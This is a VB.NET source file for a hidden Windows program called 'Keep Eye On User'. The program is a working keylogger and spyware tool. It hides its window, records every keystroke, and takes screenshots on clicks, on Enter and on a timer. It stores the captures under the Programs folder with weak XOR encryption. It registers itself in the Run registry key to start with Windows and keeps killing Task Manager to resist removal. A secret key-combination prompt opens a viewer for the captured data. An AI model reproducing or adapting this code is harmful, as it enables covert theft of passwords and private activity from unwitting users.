Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Net.Sockets
Imports System.IO
Imports System.IO.Compression
Public Class Form1
    Public Inputs As String = ""
    Public Event OnOk()
    Public Event Escp()
    Public Password As String = ""
    Public Work As Boolean = True
    Public Thread1 As New Threading.Thread(AddressOf Keepingeye)
    Public Sub EscPressed()
        Try
1:
            If GetAsyncKeyState(Keys.Escape) And GetAsyncKeyState(Keys.Space) Then
                If Work = False Then
                    Dim Command As String = InputBox("Wrirte Command  >>>>>>>>>", "Command")
                    If Command = "Stop" Then
                        Dim Md5 As String = InputBox("Write Password >>>>>>>>>>>", "Password")
                        If Md5 = Password Then
                            MsgBox("you did it first you can order to start work but not to stop")
                            GoTo 1
                        Else
                            MsgBox("Someting Went wrong...")
                            GoTo 1
                        End If
                    ElseIf Command = "Start" Then
                        Dim Md5 As String = InputBox("Write Password >>>>>>>>>>>", "Password")
                        If Md5 = Password Then
                            Work = True
                            MsgBox("Done")
                            GoTo 1
                        Else
                            MsgBox("Wrong Password..........")
                            Work = False
                            GoTo 1
                        End If
                    ElseIf Command = "Change Password" Then
                        Dim md5 As String = InputBox("Write Old Password >>>>>>>>>>", "Old Password")
                        If md5 = Password Then
                            Dim NewPassword As String = InputBox("Write New Password >>>>>>>>>>", "New Password")
                            Dim Folder As String = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
                            Dim Path As String = Folder + "\Keep Eye On User\KeepSafe.xml"
                            IO.File.Delete(Path)
                            Password = ""
                            Password = NewPassword
                            SavePassword()
                            MsgBox("Done")
                            GoTo 1
                        Else
                            MsgBox("Wrong Password..........")
                            GoTo 1
                        End If
                    ElseIf Command = "Show Security Details" Then
                        Dim md5 As String = InputBox("Write Password >>>>>>>>>", "Password")
                        If md5 = Password Then
                            Me.Show()
                            ShowAllFiles()
                            GoTo 1
                        Else
                            MsgBox("Wrong Password..........")
                            GoTo 1
                        End If
                    End If
                End If
                If Work = True Then
                    Work = False
                    Dim Command As String = InputBox("Wrirte Command  >>>>>>>>>", "Command")
                    If Command = "Stop" Then
                        Dim Md5 As String = InputBox("Write Password >>>>>>>>>>>", "Password")
                        If Md5 = Password Then
                            Work = False
                            MsgBox("Done")
                            GoTo 1
                        Else
                            MsgBox("Wrong Password..........")
                            Work = True
                            GoTo 1
                        End If
                    ElseIf Command = "Change Password" Then
                        Dim md5 As String = InputBox("Write Old Password >>>>>>>>>>", "Old Password")
                        If md5 = Password Then
                            Dim NewPassword As String = InputBox("Write New Password >>>>>>>>>>", "New Password")
                            Dim Folder As String = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
                            Dim Path As String = Folder + "\Keep Eye On User\KeepSafe.xml"
                            IO.File.Delete(Path)
                            Password = ""
                            Password = NewPassword
                            SavePassword()
                            MsgBox("Done")
                            Work = True
                            GoTo 1
                        Else
                            MsgBox("Wrong Password..........")
                            Work = True
                            GoTo 1
                        End If
                    ElseIf Command = "Show Security Details" Then
                        Dim md5 As String = InputBox("Write Password >>>>>>>>>", "Password")
                        If md5 = Password Then
                            Me.Show()
                            ShowAllFiles()
                            Work = True
                            GoTo 1
                        Else
                            MsgBox("Wrong Password..........")
                            Work = True
                            GoTo 1
                        End If
                    ElseIf Command = "Start" Then
                        Dim Md5 As String = InputBox("Write Password >>>>>>>>>>>", "Password")
                        If Md5 = Password Then
                            MsgBox("you did it first you can order to stop work but not to start")
                            GoTo 1
                        Else
                            MsgBox("Someting Went wrong...")
                            GoTo 1
                        End If
                    End If
                End If
            End If
        Catch ex As Exception
            MsgBox("Something Went Wrong .......")
        End Try
    End Sub
    Public Sub SavePassword()
        Try
            Dim Folder As String = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
            If IO.Directory.Exists(Folder + "\Keep Eye On User") Then
            Else
                IO.Directory.CreateDirectory(Folder + "\Keep Eye On User")
            End If
            Dim Path As String = Folder + "\Keep Eye On User\KeepSafe.xml"
            If File.Exists(Path) Then
                Dim ByPass As Byte() = IO.File.ReadAllBytes(Path)
                Dim DePass As Byte() = Decompress(ByPass)
                Dim md55 As String = "Password"
                Dim Decpass As Byte() = Decrypt(DePass, md55)
                Password = DeSerialize(Of String)(Decpass)
            Else
0:
                If Password <> "" Then
                    Dim md5 As String = Password
                    Dim Bytes() As Byte = Serialize(md5)
                    Dim md55 As String = "Password"
                    Dim Encrypted() As Byte = encrypt(Bytes, md55)
                    Dim Compressed() As Byte = Compress(Encrypted)
                    IO.File.WriteAllBytes(Path, Compressed)
                Else
1:
                    Dim GetPassword As String
                    GetPassword = InputBox("Write Your Password Here >>>>", "Getting Password")
                    If GetPassword <> "" Then
                        Password = GetPassword
                        GoTo 0
                    Else
                        GoTo 1
                    End If
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub
    Public Sub KillTaskmgr()
        Try
            For Each P In Process.GetProcesses
                If P.ProcessName = "Taskmgr" Then
                    P.Kill()
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub
    Public Sub Keepingeye()
        Try
Start:
            Do
                SavePassword()
                If Work = True Then
                    If Inputs.Length > 0 Then
                        If MouseButtons = Windows.Forms.MouseButtons.XButton1 Then
                            RaiseEvent OnOk()
                        ElseIf GetAsyncKeyState(Keys.Enter) Then
                            RaiseEvent OnOk()
                        ElseIf MouseButtons = Windows.Forms.MouseButtons.XButton2 Then
                            RaiseEvent OnOk()
                        ElseIf MouseButtons = Windows.Forms.MouseButtons.Right Then
                            RaiseEvent OnOk()
                        ElseIf MouseButtons = Windows.Forms.MouseButtons.Left Then
                            RaiseEvent OnOk()
                        ElseIf MouseButtons = Windows.Forms.MouseButtons.Middle Then
                            RaiseEvent OnOk()
                        End If
                    End If
                    KillTaskmgr()
                Else
                End If
                RegisterKey()
                Threading.Thread.Sleep(10)
            Loop
        Catch ex As Exception
            Threading.Thread.Sleep(10)
            GoTo Start
        End Try
    End Sub
    Public Sub OkSave()
        Try
            Save()
            Inputs = ""
        Catch ex As Exception
        End Try
    End Sub
    Public Sub OnkeyPressed(ByVal Key As Keys, ByVal Character As Char)
        Try
            If Key = Keys.Back Then
                Try
                    Inputs += Chr(Keys.Back)
                    If Inputs.Length > 0 Then
                        For Each c As Char In Inputs
                            If c = Chr(Keys.Back) Then
                                If Inputs.IndexOf(c) = 0 Then
                                    Inputs = Inputs.Remove(Inputs.IndexOf(c), 1)
                                Else
                                    Inputs = Inputs.Remove(Inputs.IndexOf(c) - 1, 2)
                                End If
                            End If
                        Next
                    End If
                Catch ex As Exception
                End Try
            Else
                If Character <> Chr(0) And Character <> Chr(13) Then
                    Inputs += Character
                End If
            End If
        Catch
        End Try
    End Sub
    Public Sub RegisterKey()
        Try
            Dim regkey As Microsoft.Win32.RegistryKey
            regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SoftWare\Microsoft\Windows\CurrentVersion\Run", True)
            regkey.SetValue("Keep Eye On User.exe", Application.ExecutablePath)
            regkey.Close()
        Catch ex As Exception
        End Try
    End Sub
    <DllImport("user32.dll")>
    Public Shared Function GetAsyncKeyState(ByVal vKey As Keys) As Short
    End Function
    Public Shared Function encrypt(ByVal Data As Byte(), ByVal Password As String) As Byte()
        Dim Encrypted(Data.Count - 1) As Byte
        Dim Passpos As Integer
        Dim Passchar As Char
        Dim b As Integer
        Dim a As Integer
        For i = 0 To Data.Count - 1
            Passpos = CircularPositionPositive(i, Password.Count - 1)
            Passchar = Password(Passpos)
            b = Asc(Passchar)
            a = Data(i)
            Encrypted(i) = a Xor b
        Next
        Return Encrypted
    End Function
    Public Shared Function CircularPositionPositive(ByVal Current As Integer, ByVal Max As Integer) As Integer
        Dim value = ((Current / Max) - Math.Truncate(Current / Max)) * Max
        If value < 0 Then
            value = Max + value
        End If
        Return value
    End Function
    Public Shared Function Compress(ByVal Raw As Byte()) As Byte()
        Using Stream As IO.MemoryStream = New IO.MemoryStream
            Using Stream2 As IO.Compression.GZipStream = New IO.Compression.GZipStream(Stream, IO.Compression.CompressionMode.Compress, True)
                Stream2.Write(Raw, 0, Raw.Length)
            End Using
            Return Stream.ToArray()
        End Using
    End Function
    Public Shared Function Decrypt(ByVal Data As Byte(), ByVal Password As String) As Byte()
           Dim Encrypted(Data.Count - 1) As Byte
        Dim Passpos As Integer
        Dim Passchar As Char
        Dim b As Integer
        Dim a As Integer
        For i = 0 To Data.Count - 1
            Passpos = CircularPositionPositive(i, Password.Count - 1)
            Passchar = Password(Passpos)
            b = Asc(Passchar)
            a = Data(i)
            Encrypted(i) = a Xor b
        Next
        Return Encrypted
    End Function
    Public Shared Function Now() As String
        Return DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.ffff").Replace("/", "_").Replace(":", "_").Replace(" ", "_").Replace(".", "_").Replace("-", "_")
    End Function
    Public Sub Save()
        Try
            Dim Folder As String = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
            If IO.Directory.Exists(Folder + "\Keep Eye On User") Then
            Else
                IO.Directory.CreateDirectory(Folder + "\Keep Eye On User")
            End If
            If IO.Directory.Exists(Folder + "\Keep Eye On User\ExtraImages") Then
            Else
                IO.Directory.CreateDirectory(Folder + "\Keep Eye On User\ExtraImages")
            End If
            Dim Bytes() As Byte = System.Text.Encoding.Default.GetBytes(Inputs)
                Dim md5 As String
                If Password <> "" Then
                    md5 = Password
                Else
                    Dim Path As String = Folder + "\Keep Eye On User\KeepSafe.xml"
                    Dim ByPass As Byte() = IO.File.ReadAllBytes(Path)
                    Dim DePass As Byte() = Decompress(ByPass)
                Dim md55 As String = "Password"
                Dim Decpass As Byte() = Decrypt(DePass, md55)
                    Password = DeSerialize(Of String)(Decpass)
                    md5 = Password
            End If
            Dim Compressed() As Byte = Compress(Bytes)
            Dim Encrypted() As Byte = encrypt(Compressed, md5)
            Dim Namef As String = Now.ToString
            Dim img As New Bitmap(Captureit())
            Dim Stream As New MemoryStream()
            img.Save(Stream, Imaging.ImageFormat.Bmp)
            Dim Bytes1() As Byte = Stream.GetBuffer
            Dim md51 As String
            If Password <> "" Then
                md51 = Password
            Else
                Dim Path As String = Folder + "\Keep Eye On User\KeepSafe.xml"
                Dim ByPass As Byte() = IO.File.ReadAllBytes(Path)
                Dim DePass As Byte() = Decompress(ByPass)
                Dim md55 As String = "Password"
                Dim Decpass As Byte() = Decrypt(DePass, md55)
                Password = DeSerialize(Of String)(Decpass)
                md51 = Password
            End If
            Dim Compressed1() As Byte = Compress(Bytes1)
            Dim Encrypted1() As Byte = encrypt(Compressed1, md51)
            Dim Stream1 As New IO.FileStream(Folder + "\Keep Eye On User\" + Namef + "Comb.Xml", IO.FileMode.Create)
            Dim Writer As New BinaryWriter(Stream1)
            Writer.Write(Encrypted.Length.ToString)
            Writer.Write(Encrypted)
            Writer.Write(Encrypted1.Length.ToString)
            Writer.Write(Encrypted1)
            Writer.Flush()
            Writer.Dispose()
            Stream.Dispose()
            Inputs = ""
        Catch ex As Exception
        End Try
    End Sub
    Public Shared Function Decompress(ByVal gZip As Byte()) As Byte()
        Dim buffer As Byte()
        Using Stream As IO.Compression.GZipStream = New IO.Compression.GZipStream(New IO.MemoryStream(gZip), IO.Compression.CompressionMode.Decompress)
            Dim Array As Byte() = New Byte(&H1000 - 1) {}
            Using Stream2 As IO.MemoryStream = New IO.MemoryStream
                Dim Count As Integer = 0
                Do
                    Count = Stream.Read(Array, 0, &H1000)
                    If Count > 0 Then
                        Stream2.Write(Array, 0, Count)
                    End If
                Loop While (Count > 0)
                buffer = Stream2.ToArray
            End Using
        End Using
        Return buffer
    End Function
    Public Shared Function DeSerialize(Of T)(ByVal bytes As Byte()) As T
        Dim Serializer As New System.Xml.Serialization.XmlSerializer(GetType(T))
        Using Stream As IO.MemoryStream = New IO.MemoryStream(bytes)
            Return Serializer.Deserialize(Stream)
        End Using
    End Function
    Public Sub SaveImage1()
        Try
            Dim Folder As String = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
            If IO.Directory.Exists(Folder + "\Keep Eye On User\ExtraImages") Then
            Else
                IO.Directory.CreateDirectory(Folder + "\Keep Eye On User\ExtraImages")
            End If
            Dim img As New Bitmap(Captureit())
            Dim Stream As New MemoryStream()
            img.Save(Stream, Imaging.ImageFormat.Bmp)
            Dim Bytes() As Byte = Stream.GetBuffer
            Dim md5 As String
            If Password <> "" Then
                md5 = Password
            Else
                Dim Path As String = Folder + "\Keep Eye On User\KeepSafe.xml"
                Dim ByPass As Byte() = IO.File.ReadAllBytes(Path)
                Dim DePass As Byte() = Decompress(ByPass)
                Dim md55 As String = "Password"
                Dim Decpass As Byte() = Decrypt(DePass, md55)
                Password = DeSerialize(Of String)(Decpass)
                md5 = Password
            End If
            Dim Compressed() As Byte = Compress(Bytes)
            Dim Encrypted() As Byte = encrypt(Compressed, md5)
            IO.File.WriteAllBytes(Folder + "\Keep Eye On User\ExtraImages\" + Now.ToString + "I.Xml", Encrypted)
            Stream.Dispose()
        Catch ex As Exception
        End Try
    End Sub
    Public Shared Function Captureit() As Drawing.Image
        Dim Bmp As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Using g As Graphics = Graphics.FromImage(Bmp)
            g.CopyFromScreen(0, 0, 0, 0, Bmp.Size)
        End Using
        Return Bmp
    End Function
    Public Shared Function Serialize(ByVal Obj As Object) As Byte()
        Using Stream As IO.MemoryStream = New IO.MemoryStream
            Dim Xml As New System.Xml.Serialization.XmlSerializer(Obj.GetType)
            Xml.Serialize(Stream, Obj)
            Return Stream.ToArray
        End Using
    End Function
    Private Sub Timer1_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Try
            If Work = True Then
                SaveImage1()
            Else
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Me.ShowIcon = False
            Me.ShowInTaskbar = False
            Me.Hide()
            Thread1.Start()
            AddHandler OnOk, AddressOf OkSave
            AddHandler Escp, AddressOf EscPressed
            Timer2.Interval = 1
            Timer2.Start()
            Timer1.Interval = 300000
            Timer1.Start()
            Dim keyLogger As New Class1
            AddHandler keyLogger.OnKeyPressed, AddressOf OnkeyPressed
            keyLogger.Start()
        Catch ex As Exception
        End Try
    End Sub
    Public Sub ShowAllFiles()
        Try
            Dim Folder As String = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
            Dim Path As String = Folder + "\Keep Eye On User"
            Dim Path1 As String = Folder + "\Keep Eye On User\ExtraImages"
            Dim Files() As String = IO.Directory.GetFiles(Path)
            If Files.Count > 1 Then
                For Each File In Files
                    If File.EndsWith("Comb.Xml") Then
                        ListBox1.Items.Add(File)
                    End If
                Next
                Dim Files1() As String = IO.Directory.GetFiles(Path1)
                If Files1.Count > 1 Then
                    For Each Fil In Files1
                        If Fil.EndsWith("I.Xml") Then
                            ListBox2.Items.Add(Fil)
                        End If
                    Next
                Else
                End If
            Else
                Dim Files1() As String = IO.Directory.GetFiles(Path1)
                If Files1.Count > 1 Then
                    For Each Fil In Files1
                        If Fil.EndsWith("I.Xml") Then
                            ListBox2.Items.Add(Fil)
                        End If
                    Next
                Else
                    MsgBox("Nothing to Show ")
                End If
            End If
        Catch ex As Exception
            MsgBox("Error.........Try Again............")
        End Try
    End Sub
    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Try
            RaiseEvent Escp()
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            Dim Path As String = ListBox1.SelectedItem
            If Path <> "" Then
                Dim stream As New FileStream(Path, IO.FileMode.Open)
                Dim Reader As New BinaryReader(stream)
                Dim Count As Integer = Val(Reader.ReadString)
                Dim Bytes() As Byte = Reader.ReadBytes(Count)
                Dim Decrypted() As Byte = Decrypt(Bytes, Password)
                Dim Decompressed() As Byte = Decompress(Decrypted)
                Dim Txt As String = System.Text.Encoding.Default.GetString(Decompressed)
                Form2.RichTextBox1.Text = Txt
                Dim Count1 As Integer = Val(Reader.ReadString)
                Dim Bytes1() As Byte = Reader.ReadBytes(Count1)
                Dim Decrypted1() As Byte = Decrypt(Bytes1, Password)
                Dim Decompressed1() As Byte = Decompress(Decrypted1)
                Dim stream1 As MemoryStream = New MemoryStream(Decompressed1)
                Dim Surface As New Bitmap(Form2.PictureBox1.Size.Width, Form2.PictureBox1.Size.Height)
                Dim G As Graphics = Graphics.FromImage(Surface)
                Dim Bmp As Bitmap = New Bitmap(stream1)
                G.DrawImage(Bmp, 0, 0, Form2.PictureBox1.Size.Width, Form2.PictureBox1.Size.Height)
                Form2.PictureBox1.Image = Surface
                MsgBox("Now you can See this file")
                Form2.Show()
                Else
                    MsgBox("Please select one File ")
                End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            Dim Path As String = ListBox2.SelectedItem
            If Path <> "" Then
                Dim Bytes() As Byte = IO.File.ReadAllBytes(Path)
                Dim Decrypted() As Byte = Decrypt(Bytes, Password)
                Dim Decompressed() As Byte = Decompress(Decrypted)
                Dim stream As MemoryStream = New MemoryStream(Decompressed)
                Dim Surface As New Bitmap(Form2.PictureBox1.Size.Width, Form2.PictureBox1.Size.Height)
                Dim G As Graphics = Graphics.FromImage(Surface)
                Dim Bmp As Bitmap = New Bitmap(stream)
                G.DrawImage(Bmp, 0, 0, Form2.PictureBox1.Size.Width, Form2.PictureBox1.Size.Height)
                Form2.PictureBox1.Image = Surface
                MsgBox("Now you can See this file")
                Form2.Show()
            Else
                MsgBox("Please select one File ")
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Try
            Dim Path As String = ListBox1.SelectedItem
            If Path <> "" Then
                IO.File.Delete(Path)
                ListBox1.Items.Remove(ListBox1.SelectedItem)
                MsgBox("Done")
            Else
                MsgBox("Please Select One File")
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Try
            Dim Path As String = ListBox2.SelectedItem
            If Path <> "" Then
                IO.File.Delete(Path)
                ListBox2.Items.Remove(ListBox2.SelectedItem)
                MsgBox("Done")
            Else
                MsgBox("Please Select One File")
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    
    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        Try
            ListBox1.Items.Clear()
            ListBox2.Items.Clear()
            ShowAllFiles()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Try
            Dim Which As String = InputBox("If you want to delete the Text With Images then write Text With Images and if you want ot delete the Images Files then write Images and click ok", "Which one")
            If Which = "Text With Images" Then
                Dim Count As Integer = ListBox1.Items.Count
                If Count > 0 Then
                    For i = Count - 1 To 0 Step -1
                        File.Delete(ListBox1.Items.Item(i))
                        ListBox1.Items.RemoveAt(i)
                    Next
                    MsgBox("Done")
                Else
                    MsgBox("Done")
                End If
            ElseIf Which = "Images" Then
                Dim Count As Integer = ListBox2.Items.Count
                If Count > 0 Then
                    For i = Count - 1 To 0 Step -1
                        File.Delete(ListBox2.Items.Item(i))
                        ListBox2.Items.RemoveAt(i)
                    Next
                    MsgBox("Done")
                Else
                    MsgBox("Done")
                End If
            Else
                MsgBox("Something Went Wrong...")
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        Try
            Me.Hide()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
End Class
Public Class Class1
    Implements IDisposable

#Region "IDisposable Support"
    Private disposedValue As Boolean ' To detect redundant calls

    ' IDisposable
    Protected Overridable Sub Dispose(ByVal disposing As Boolean)
        If Not Me.disposedValue Then
            If disposing Then
                ' TODO: dispose managed state (managed objects).
            End If

            ' TODO: free unmanaged resources (unmanaged objects) and override Finalize() below.
            ' TODO: set large fields to null.
        End If
        Me.disposedValue = True
    End Sub

    ' TODO: override Finalize() only if Dispose(ByVal disposing As Boolean) above has code to free unmanaged resources.
    'Protected Overrides Sub Finalize()
    '    ' Do not change this code.  Put cleanup code in Dispose(ByVal disposing As Boolean) above.
    '    Dispose(False)
    '    MyBase.Finalize()
    'End Sub

    ' This code added by Visual Basic to correctly implement the disposable pattern.
    Public Sub Dispose() Implements IDisposable.Dispose
        ' Do not change this code.  Put cleanup code in Dispose(ByVal disposing As Boolean) above.
        Dispose(True)
        GC.SuppressFinalize(Me)
    End Sub
#End Region
    Public Const SleepTime As Integer = 10
    Public DownMap As New List(Of Keys)
    Public Event OnKeyPressed(ByVal key As Keys, ByVal Character As Char)
    Public Property _IsDisposed As Boolean
    Public Property _IsRunning As Boolean
    Public Thread As New Threading.Thread(AddressOf Work)
    Public Sub Start()
        _IsRunning = True
    End Sub
    Public Sub [Stop]()
        _IsRunning = False
    End Sub
    Private Sub Work()
        Do
            Dim KeyBoardState(256 - 1) As Byte
            Dim Buffer As New StringBuilder(256)
            If _IsDisposed Then
                Exit Do
            End If
            If _IsRunning Then
                For Each Key In KeysMap
                    Dim Contains As Boolean = DownMap.Contains(Key)
                    If GetAsyncKeyState(Key) <> 0 Then
                        If Not Contains Then
                            DownMap.Add(Key)
                            Dim IsShift As Boolean = DownMap.Contains(Keys.Shift) Or DownMap.Contains(Keys.LShiftKey) Or DownMap.Contains(Keys.RShiftKey)
                            Dim NumLock As Boolean = Control.IsKeyLocked(Keys.NumLock)
                            Dim CapsLock As Boolean = Control.IsKeyLocked(Keys.CapsLock)
                            Dim ScrollLock As Boolean = Control.IsKeyLocked(Keys.Scroll)
                            For i = 0 To 256 - 1
                                KeyBoardState(i) = 0
                            Next
                            Buffer.Clear()
                            If IsShift Then KeyBoardState(Keys.ShiftKey) = Byte.MaxValue
                            If NumLock Then KeyBoardState(Keys.NumLock) = Byte.MaxValue
                            If CapsLock Then KeyBoardState(Keys.CapsLock) = Byte.MaxValue
                            If ScrollLock Then KeyBoardState(Keys.Scroll) = Byte.MaxValue
                            Dim OutPut As Integer = ToUnicode(Key, 0, KeyBoardState, Buffer, 256, 0)
                            Dim Text As String = Buffer.ToString
                            If Text.Length <> 0 Then
                                RaiseEvent OnKeyPressed(Key, Text(0))
                            Else
                                RaiseEvent OnKeyPressed(Key, Chr(0))
                            End If
                        End If
                    Else
                        If Contains Then DownMap.Remove(Key)
                    End If
                Next
            End If
            Threading.Thread.Sleep(SleepTime)
        Loop
    End Sub
    <DllImport("user32.dll")>
    Public Shared Function GetAsyncKeyState(ByVal vKey As Keys) As Short
    End Function
    <DllImport("user32.dll")>
    Private Shared Function ToUnicode(ByVal VirtualKeyCode As UInteger, ByVal ScanCode As UInteger, ByVal KeyBoardState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr, sizeConst:=64)> ByVal recievingBuffer As StringBuilder, ByVal buffersize As Integer, ByVal flags As UInteger) As Integer
    End Function
    Public Sub _Dispose()
        _IsDisposed = True
    End Sub
    Sub New()
        Thread.Start()
    End Sub
    Public Shared Property KeysMap As Keys()
    Shared Sub New()
        KeysMap = [Enum].GetValues(GetType(Keys))
    End Sub
End Class